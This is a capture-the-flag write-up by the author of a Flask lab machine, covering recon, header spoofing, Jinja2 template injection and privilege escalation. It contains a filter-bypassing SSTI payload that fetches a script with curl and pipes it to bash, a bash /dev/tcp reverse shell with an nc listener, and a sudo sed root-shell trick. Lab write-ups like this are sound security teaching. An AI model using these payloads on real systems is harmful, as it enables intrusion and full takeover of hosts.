# Vuln_ERR_able - Official Write-up

## Before starting

In this write-up :
- 192.168.56.1 refers to my local machine
- 192.168.56.80 refers to our target, the vulnerable machine

## Scanning and recon phase

First things first, let's scan the target machine to see which ports are open. Here I'll just run a simple nmap scan using the `-A` argument, to enable OS and version detection, script scanning, and traceroute:
```bash
$ nmap -A 192.168.56.80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 11:16 +07
Nmap scan report for vulnerrable.thm (192.168.56.80)
Host is up (0.00011s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/2e51aab2-8824-47a6-9492-2dd9d533644a
|_http-title: Flask'it
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
Nmap done: 1 IP address (1 host up) scanned in 6.35 second
```

It looks like we're attacking a Linux machine, running Ubuntu. Nmap found only 1 port open, and seems to have found an interesting hidden entry, specified in `/robots.txt`. We'll verify this in a minute, but first let's have a look at the root directory for this website:
 
![flaskit_website](https://user-images.githubusercontent.com/58345798/210207658-1f9c70b4-83a0-433f-9237-929020f742b0.png)

Hmm, nothing interesting here: just a static website with a bunch of images and some text, something about bottles, gourds, and more or less flasks. Now, that plus the fact that you probably saw the "flask" tag linked to the THM room : all of this makes us say that this website is probably made with Flask, a python micro framework for web development. For those aleady familiar with this micro framework, you should know Flask is a WSGI application (or *Web Server Gateway Interface*, [see more here](https://en.wikipedia.org/wiki/Web_Server_Gateway_Interfacehttps://en.wikipedia.org/wiki/Web_Server_Gateway_Interface)). This means in order to run a flask application, we'll need a A WSGI server, which will convert incoming HTTP requests to the standard WSGI environ, and convert outgoing WSGI responses to HTTP responses. Now, it is important to know this before continuing, because here we can see the website is served from an Nginx server. This is most likely to be a reverse proxy architecture, where our HTTP server is placed in front of the WSGI server. Understanding this will may be helpful for the rest of the challenge... :)

Ok, enough talking for now, let's continue hacking this website ! Checking the `/robots.txt` will confirm what we obtained during our nmap scan: there is a hidden endpoint:
```
$ curl http://192.168.56.80/robots.txt
User-agent: *
Disallow: /2e51aab2-8824-47a6-9492-2dd9d533644a
```

Visiting the hidden endpoint `/2e51aab2-8824-47a6-9492-2dd9d533644a` :
```bash
$ curl http://192.168.56.80/2e51aab2-8824-47a6-9492-2dd9d533644a
<!doctype html>
<html lang=en>
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>Only 127.0.0.1 can access this page</p>
```

And we get an error, a *403 Forbidden* with a quite interesting message : "Only 127.0.0.1 can access this page". Looks like to bypass this error, we'll have to spoof our IP address to make the server think we are 127.0.0.1, and not 192.168.56.80. 

## Bypassing the 403 error

That's where my small story about the reverse proxy comes useful to know ! Let me explain: if this website is indeed built with flask, this means our IP address has to get through a proxy (Nginx here) before the WSGI receives anything. There are multiple ways to do that, one of them is using some headers, like `X-Forwarded-For` (a commonly used one for this purpose). What happens is the proxy will receive a request from the client, will look at his IP address and then will set a header with that client's IP as value inside the request to the WSGI server. Then to see what IP the client has, the server just have to check for that header's value. Let's try and spoof our IP by setting the `X-Forwarded-For header` as the value we want, here 127.0.0.1: 
```bash
$ curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.56.80/2e51aab2-8824-47a6-9492-2dd9d533644a
<!DOCTYPE html>
<html>
<head>
<title>Secret Page</title>
</head>
<body>
<p>Q2hlY2sgZm9yIGFueSBHRVQgcGFyYW1z</p>
</body>
</html>
```
It worked ! Now, we can see an encoded string inside some `<p>` tags, it looks like base64 (at least it could be). Let's try decoding it:
```bash
$ echo "Q2hlY2sgZm9yIGFueSBHRVQgcGFyYW1z" | base64 -d
Check for any GET params
```
A hint, what a surprise ! Now that's some real-world immersive CTF experience, right ? :)
Let's do what it's written and try finding any parameter that will change the comportement of the page. 

## Bruteforcing GET params

If you have your week-end free and you don't know what to do, you could try any potential parameter one by one by hand. I'll chose not to, I'll go ahead and use a tool called `arjun` ([github link here](https://github.com/s0md3v/Arjun)) that will allow me to bruteforce the GET parameters for me.
> Note: don't forget to set the `X-Forwarded-For` again here, to avoid that 403 Forbidden error

```bash
$ arjun -u http://192.168.56.80/2e51aab2-8824-47a6-9492-2dd9d533644a --headers "X-Forwarded-For: 127.0.0.1"
_
/_| _ '
( |/ /(//) v2.2.1
_/

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: command, based on: body length
[+] Parameters found: command
```
`Arjun` found a parameter that changed the page's body length, interesting ! Let's see what this param really does: 
```bash
$ curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.56.80/2e51aab2-8824-47a6-9492-2dd9d533644a?command=test
<!DOCTYPE html>
 <html>
   <head>
     <title>Secret Page</title>
   </head>
   <body>
     <p>test</p>
   </body>
 </html>
```
The value of the `command` param is reflecting on the page! Let's see if it's vulnerable to SSTI (Server-Side Template Injection). Still assuming our website is running with Flask, the syntax of a basic injection would look like this : `{{6*7}}`, this would execute and render `42` in the HTML template. 
> Here I'll use Postman for the example, as it is one simple way to specify the `X-forwarded-For` header, but using burpsuite, your browser's developer tools or any other tool would perfectly work too for this kind of job. You could also continue using curl, but don't forget to escape special chars, or to manually encode your command, as it only accepts URL encoding format.

![postman](https://user-images.githubusercontent.com/58345798/210207689-0f038a01-3c0e-4ad8-a504-d61ba062d680.png)

Bingo ! Our speculations about the Flask app turned out to be true, moreover the application is vulnerable to SSTI !

## Exploiting the vulnerability

Searching for an exploit on our favorite github repo, aka [PayloadsAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2), it looks like we can get RCE (Remote Code Execution) quite easily, using a reverse shell. 
Let's set everything up:

1. Write a simple `revshell` script that will be downloaded and executed on the target machine:
```
#!/bin/bash
bash -c "bash -i >& /dev/tcp/192.168.56.1/4000 0>&1"
```
2. Launch an HTTP server, for the script to be downloaded: 
```bash
$ python3 -m http.server 8000 # In the same directory as your revshell
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
3. Listening on the port 4000, to receive our `revshell` connexion:
```bash
$ nc -lnvp 4000
Listening on 0.0.0.0 4000
```
4. Set the `?command=` value to your payload, and send the request:
![Postman2](https://user-images.githubusercontent.com/58345798/210207722-be172d1d-03fd-4ed5-8569-4dca22832036.png)


Looks like we'll have to search a bit more, to find an exploit that bypasses this specific filter. One way to do it is modifying our first payload using Jinja2's `attr()` filter, accepting hex encoded format.
Our final payload looks like this :
`{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 192.168.56.1:8000/revshell | bash")|attr("read")()}}`

Resend the request... And yes, we've got our shell ! 
```
flaskit@vuln-err-able:~$ whoami
flaskit
flaskit@vuln-err-able:~$ id
uid=1001(flaskit) gid=1001(flaskit) groups=1001(flaskit),27(sudo),33(www-data)
```
We're logged in as a simple user, named `flaskit`, without exploring more than its home directory, we can find the first flag: 
```
flaskit@vuln-err-able:~$ cat user.txt
f7a03995bcbfb00971314293eeac7202
```

## All the way up to root

The last step is getting root privileges. One of the first things that should comes into your mind when it comes to linux privesc, is to check for the `sudo` config. 
```
flaskit@vuln-err-able:~$ sudo -l
Matching Defaults entries for flaskit on vuln-err-able:
env_reset, exempt_group=sudo, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
User flaskit may run the following commands on vuln-err-able:
(ALL : ALL) ALL
(ALL) NOPASSWD: /bin/sed
```

Looks like it'll be faster than expected. We can run the `sed` command using sudo without any password required, as the last line of the `sudo -l` output shows us. Doing a simple search on our good ol' [GTFOBins](https://gtfobins.github.io/), we find ([right here](https://gtfobins.github.io/gtfobins/sed/)) that we can exploit the `sed` command to get a root shell !


```
flaskit@vuln-err-able:~$ sudo sed -n '1e exec sh 1>&0' /etc/hosts
id
uid=0(root) gid=0(root) groups=0(root)
```
Et voilà! The challenge is over, you just have to navigate to `/root`, and proudly read `root.txt`'s content.
```
cat root.txt
bf2ae566e364a905320c401ef95528cd
```

## Thank you !

This challenge is the very first CTF I ever realized, I hope you enjoyed it ! It was really lots of fun for me, and I definitely learned a lot during the realisation process ! :) 
For the VM configuration part, I used `Vagrant` to make the process a bit more automated. The vagrant config file and all the source code are available here on my github. 
(Oh and I hope I didn't make too many english mistakes, as it's not my first language)

Thank you for trying out this challenge, and keep on hacking !
~ Hugo Vanrobaeys, or *QuetzalCtrl*

### Resources 
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
- https://www.synacktiv.com/en/publications/cve-2022-31813-forwarding-addresses-is-hard.html
- https://stackoverflow.com/questions/12770950/flask-request-remote-addr-is-wrong-on-webfaction-and-not-showing-real-user-ip
- https://0day.work/jinja2-template-injection-filter-bypasses/
- https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
